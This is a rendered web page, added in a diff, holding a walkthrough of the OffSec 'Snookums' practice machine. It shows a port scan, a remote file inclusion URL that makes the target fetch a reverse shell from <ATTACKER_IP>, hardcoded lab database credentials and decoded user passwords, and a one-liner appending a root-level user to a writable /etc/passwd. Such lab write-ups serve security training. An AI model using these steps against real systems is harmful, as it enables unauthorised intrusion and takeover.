@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="print">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.164.0">
+    <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
+    <meta name="description" content="A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Snookums :: Zenu">
+    <meta name="twitter:description" content="A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.">
+    <meta property="og:url" content="http://localhost:1313/writeup/proving-grounds/snookums/index.html">
+    <meta property="og:site_name" content="Zenu">
+    <meta property="og:title" content="Snookums :: Zenu">
+    <meta property="og:description" content="A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Writeup">
+    <meta property="article:published_time" content="2026-03-31T11:11:14+09:00">
+    <meta property="article:modified_time" content="2026-03-31T11:11:14+09:00">
+    <meta property="article:tag" content="Openssl">
+    <meta property="article:tag" content="Etc/Passwd">
+    <meta property="article:tag" content="Writable">
+    <meta itemprop="name" content="Snookums :: Zenu">
+    <meta itemprop="description" content="A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.">
+    <meta itemprop="datePublished" content="2026-03-31T11:11:14+09:00">
+    <meta itemprop="dateModified" content="2026-03-31T11:11:14+09:00">
+    <meta itemprop="wordCount" content="428">
+    <meta itemprop="keywords" content="Openssl,Etc/Passwd,Writable">
+    <title>Snookums :: Zenu</title>
+    <link href="http://localhost:1313/writeup/proving-grounds/snookums/index.html" rel="canonical" type="text/html" title="Snookums :: Zenu">
+    <link href="/images/favicon.png?1788226668" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1788226668" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1788226668" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1788226668" defer></script>
+    <script src="/js/search-lunr.js?1788226668" defer></script>
+    <script src="/js/search.js?1788226668" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1788226668";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1788226668" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1788226668" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1788226668" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1788226668" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1788226668" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1788226668" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1788226668" rel="stylesheet">
+    <link href="/css/theme.css?1788226668" rel="stylesheet">
+    <link href="/css/format-print.css?1788226668" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = ``;
+      window.relearn.path='\/writeup\/proving-grounds\/snookums\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'relearn-light', 'relearn-dark', 'neon', 'zen-dark', 'zen-light' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DCM6KK9XFG"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-DCM6KK9XFG');
+</script>
+
+  </head>
+  <body class="mobile-support print" data-origin="/writeup/proving-grounds/snookums/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#apache---michael">apache -&gt; michael</a></li>
+    <li><a href="#michael---root">michael -&gt; root</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Home</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/index.html"><span itemprop="name">Writeup</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/proving-grounds/index.html"><span itemprop="name">Proving Grounds</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Snookums</span><meta itemprop="position" content="4"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-print default-animation" data-content-empty="disable" data-width-s="area-more" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/snookums/index.print.html" title="Print whole chapter (CTRL+ALT+p)"><i class="fa-fw fas fa-print"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/zipper/index.html" title="Zipper (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/squid/index.html" title="Squid (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable writeup" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+<div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/tags/etc/passwd/index.html">Etc/Passwd</a></li>
+    <li><a class="term-link" href="/tags/openssl/index.html">Openssl</a></li>
+    <li><a class="term-link" href="/tags/writable/index.html">Writable</a></li>
+  </ul>
+</div>
+  </header>
+
+<h1 id="snookums">Snookums</h1>
+
+<h1 id="port-scan">port scan<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp         vsftpd 3.0.2
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:192.168.45.245
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.2 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh         OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http        Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+</span></span><span style="display:flex;"><span>|_http-title: Simple PHP Photo Gallery
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind     2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
+</span></span><span style="display:flex;"><span>| rpcinfo: 
+</span></span><span style="display:flex;"><span>|   program version    port/proto  service
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/tcp6  rpcbind
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">100000</span>  3,4          111/udp6  rpcbind
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: SAMBA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  netbios-ssn Samba smbd 4.10.4 <span style="color:#f92672">(</span>workgroup: SAMBA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3306/tcp  open  mysql       MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>33060/tcp open  mysqlx      MySQL X protocol listener
+</span></span><span style="display:flex;"><span>Service Info: Host: SNOOKUMS; OS: Unix</span></span></code></pre></div>
+<h1 id="initial-foothold">initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>Upon navigating to the web interface, I identified the version of the underlying framework.</p>
+<p><a href="#R-image-34419a49ef38de9deec75b2d662485df" class="lightbox-link"><img alt="web" class="lazy lightbox figure-image" loading="lazy" src="/images/snookums/web-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-34419a49ef38de9deec75b2d662485df"><img alt="web" class="lazy lightbox lightbox-image" loading="lazy" src="/images/snookums/web-1.png"></a></p>
+<p>Researching this specific version revealed that version 0.7 is vulnerable to <a href="https://www.exploit-db.com/exploits/48424" rel="external">RFI vulnerability</a>.</p>
+<p>Through further testing, I confirmed that this vulnerability persists in version 0.8 as well.</p>
+<p>To gain an initial shell, I prepared a PHP reverse shell script on my local attacker machine. I then leveraged the RFI vulnerability by pointing the <code>img</code> parameter to my hosted shell:</p>
+<p><code>http://&lt;TARGET_IP&gt;/image.php?img=http://&lt;ATTACKER_IP&gt;/revshell.php</code></p>
+<p>Executing this request triggered the reverse shell, granting me initial access to the victim server as the Apache user.</p>
+<h1 id="privilege-escalation">Privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="apache---michael">apache -&gt; michael<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>While enumerating the web root directory, I discovered a database configuration file containing hardcoded credentials:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBHOST&#39;</span>, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBUSER&#39;</span>, <span style="color:#e6db74">&#39;root&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBPASS&#39;</span>, <span style="color:#e6db74">&#39;MalapropDoffUtilize1337&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBNAME&#39;</span>, <span style="color:#e6db74">&#39;SimplePHPGal&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div>
+<p>Using these credentials to access the local database, I extracted the users table, which contained several Base64-encoded passwords:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>+----------+----------------------------------------------+
+| username | password                                     |
++----------+----------------------------------------------+
+| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
+| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
+| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
++----------+----------------------------------------------+</code></pre></div>
+<p>After decoding the strings, I successfully retrieved the cleartext password for the user michael:</p>
+<p><code>HockSydneyCertify123</code></p>
+<h2 id="michael---root">michael -&gt; root<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>After switching to michael via SSH, I ran linpeas.</p>
+<p>The results highlighted the <code>/etc/passwd</code> file was writable.</p>
+<p>I exploited this by appending a new user with root privileges (UID 0) to the passwd file:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>openssl passwd Password123<span style="color:#66d9ef">)</span>; echo <span style="color:#e6db74">&#34;r00t:</span><span style="color:#e6db74">${</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">:0:0:root:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd</span></span></code></pre></div>
+<p>Finally, switch user to r00t with the password.</p>
+
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> Mar 31, 2026
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1788226668" defer></script>
+    <script src="/js/theme.js?1788226668" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
